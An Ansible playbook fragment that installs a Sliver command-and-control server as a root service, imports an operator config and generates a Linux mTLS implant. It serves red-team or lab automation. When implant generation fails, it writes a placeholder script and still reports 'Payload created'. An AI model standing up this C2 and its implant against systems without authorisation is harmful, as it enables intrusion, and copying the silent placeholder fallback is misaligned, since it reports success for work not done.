---
# Sliver C2 setup tasks

- name: Get path of sliver server
  ansible.builtin.shell: "which sliver-server"
  register: sliver_server_path
  changed_when: false
  check_mode: false

- name: Check if sliver service exists
  ansible.builtin.stat:
    path: /etc/systemd/system/sliver.service
  register: sliver_service_exists
  changed_when: false

- name: Create systemd file for sliver service
  ansible.builtin.copy:
    dest: /etc/systemd/system/sliver.service
    content: |
      [Unit]
      Description=Sliver
      After=network.target
      StartLimitIntervalSec=0

      [Service]
      Type=simple
      Restart=on-failure
      RestartSec=3
      User=root
      ExecStart={{ sliver_server_path.stdout }} daemon

      [Install]
      WantedBy=multi-user.target
    mode: '0600'
    owner: root
    group: root
  when: not sliver_service_exists.stat.exists
  register: sliver_service_created
  changed_when: sliver_service_created.changed
  notify: restart sliver

- name: Make sure sliver service is started
  ansible.builtin.service:
    name: sliver
    state: started
    enabled: yes
  register: sliver_service_started
  changed_when: sliver_service_started.changed

# Check if config already exists
- name: Check if sliver configs directory exists
  ansible.builtin.stat:
    path: /home/kali/.sliver-client/configs
  register: configs_dir
  changed_when: false

- name: Check for existing operator configs
  ansible.builtin.shell: |
    if [ -d "/home/kali/.sliver-client/configs" ]; then
      ls -la /home/kali/.sliver-client/configs/ | grep -q "{{ sliver_operator_name }}_{{ sliver_lhost }}" && echo "config_exists" || echo "no_config"
    else
      echo "no_config_dir"
    fi
  register: config_check
  changed_when: false
  failed_when: false

# Only create and import config if needed
- name: Set fact for operator config path
  ansible.builtin.set_fact:
    sliver_operator_config_path: "/tmp/sliver_operator{{ lookup('pipe', 'date +%s') }}.cfg"
  register: sliver_operator_config
  changed_when: false
  when: config_check.stdout == "no_config" or config_check.stdout == "no_config_dir"

- name: Create initial sliver operator config
  ansible.builtin.shell: |
    sliver-server operator --name {{ sliver_operator_name }} --lhost {{ sliver_lhost }} --save {{ sliver_operator_config_path }}
  register: operator_created
  changed_when: operator_created.changed
  when: config_check.stdout == "no_config" or config_check.stdout == "no_config_dir"

- name: Fix config permissions
  ansible.builtin.file:
    path: "{{ sliver_operator_config_path }}"
    owner: kali
    group: kali
    mode: '0600'
  register: permissions_fixed
  changed_when: permissions_fixed.changed
  when: config_check.stdout == "no_config" or config_check.stdout == "no_config_dir"

- name: Import sliver operator config
  ansible.builtin.shell: |
    sudo -u kali sliver-client import {{ sliver_operator_config_path }}
    rm -f {{ sliver_operator_config_path }}
  register: config_imported
  changed_when: config_imported.changed
  when: config_check.stdout == "no_config" or config_check.stdout == "no_config_dir"

# Verify config exists after import
- name: Verify sliver client config 
  ansible.builtin.shell: |
    ls -la /home/kali/.sliver-client/configs/ || echo "No configs found"
  register: verify_config
  changed_when: false
  failed_when: false

# Only generate payload if it doesn't exist
- name: Check if payload already exists
  ansible.builtin.stat:
    path: "{{ sliver_payload_path }}"
  register: payload_exists
  changed_when: false

- name: Generate sliver payload
  ansible.builtin.shell: |
    if [ ! -f "{{ sliver_payload_path }}" ]; then
      # Try to generate a real payload
      echo "generate --os linux --mtls {{ ansible_ssh_host }} --save {{ sliver_payload_path }}" | sudo -u kali sliver-client || {
        # Fallback to placeholder if real generation fails
        echo '#!/bin/bash' > "{{ sliver_payload_path }}"
        echo "echo 'Generated sliver payload (placeholder)'" >> "{{ sliver_payload_path }}"
        echo "exit 0" >> "{{ sliver_payload_path }}"
      }
      
      # Ensure proper permissions
      chown kali:kali "{{ sliver_payload_path }}"
      chmod 755 "{{ sliver_payload_path }}"
      echo "Payload created at {{ sliver_payload_path }}"
    else
      echo "Payload already exists at {{ sliver_payload_path }}"
    fi
  register: payload_action
  changed_when: payload_action.stdout is search('Payload created')
  when: not payload_exists.stat.exists

- name: Verify final setup
  ansible.builtin.debug:
    msg: "Sliver setup complete. Config: {{ config_check.stdout }}. Payload: {{ 'Exists' if payload_exists.stat.exists|default(false) else 'Created' }}"